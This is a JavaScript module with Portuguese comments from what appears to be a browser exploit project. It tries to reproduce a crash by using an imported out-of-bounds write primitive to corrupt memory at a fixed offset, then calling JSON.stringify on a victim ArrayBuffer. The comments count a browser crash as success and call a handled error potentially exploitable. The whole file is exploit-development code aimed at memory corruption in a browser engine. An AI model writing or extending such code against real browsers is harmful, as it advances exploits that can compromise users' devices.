// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: REPRODUZIR CRASH INICIAL)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex, AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração para Reprodução de Crash ---
const CRASH_REPRO_CONFIG = {
    // Offset que provavelmente causou o crash nos testes iniciais.
    corruption_offset: 0x70,
    
    // Valor clássico para corrupção de ponteiros ou metadados.
    corruption_value: 0xffffffff,

    // O objeto que passaremos para JSON.stringify para acionar a vulnerabilidade.
    victim_ab_size: 64,
};
// --- Fim dos Parâmetros ---

export async function reproduceInitialCrash() {
    const FNAME = "reproduceInitialCrash";
    logS3(`--- Iniciando Tentativa de Reprodução do Crash Original ---`, "test", FNAME);
    logS3(`   Alvo de Corrupção: Offset ${toHex(CRASH_REPRO_CONFIG.corruption_offset)} com valor ${toHex(CRASH_REPRO_CONFIG.corruption_value)}`, 'info', FNAME);

    await triggerOOB_primitive();
    if (!oob_write_absolute) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
        return;
    }

    // Criamos um objeto vítima simples.
    let victim_ab = new ArrayBuffer(CRASH_REPRO_CONFIG.victim_ab_size);
    logS3(`ArrayBuffer vítima (${CRASH_REPRO_CONFIG.victim_ab_size} bytes) criado.`, "info", FNAME);

    // Etapa 1: Corromper a memória no offset conhecido.
    logS3("Realizando a escrita Out-of-Bounds (OOB) para corromper a memória...", "warn", FNAME);
    try {
        oob_write_absolute(CRASH_REPRO_CONFIG.corruption_offset, CRASH_REPRO_CONFIG.corruption_value, 4);
    } catch (e) {
        logS3(`Falha crítica ao escrever OOB: ${e.message}`, "error", FNAME);
        clearOOBEnvironment();
        return;
    }
    
    await PAUSE_S3(100);

    // Etapa 2: Chamar a função que aciona o uso da memória corrompida.
    // O SINAL DE SUCESSO É O CRASH DO NAVEGADOR NESTE PONTO.
    logS3("Chamando JSON.stringify(victim_ab)... Se o exploit for bem-sucedido, o navegador irá travar agora.", "vuln", FNAME);

    try {
        JSON.stringify(victim_ab);
        
        // Se o código chegar aqui, o crash não ocorreu.
        logS3("--- FALHA ---", "warn", FNAME);
        logS3("JSON.stringify completou sem travar. O estado vulnerável não foi alcançado.", "warn", FNAME);

    } catch (e) {
        logS3(`--- SUCESSO PARCIAL ---`, "good", FNAME);
        logS3(`Ocorreu um erro tratável em vez de um crash: ${e.message}`, "good", FNAME);
        logS3("Isso ainda é um resultado útil e pode ser explorável.", "info", FNAME);
    } finally {
        clearOOBEnvironment();
    }
}
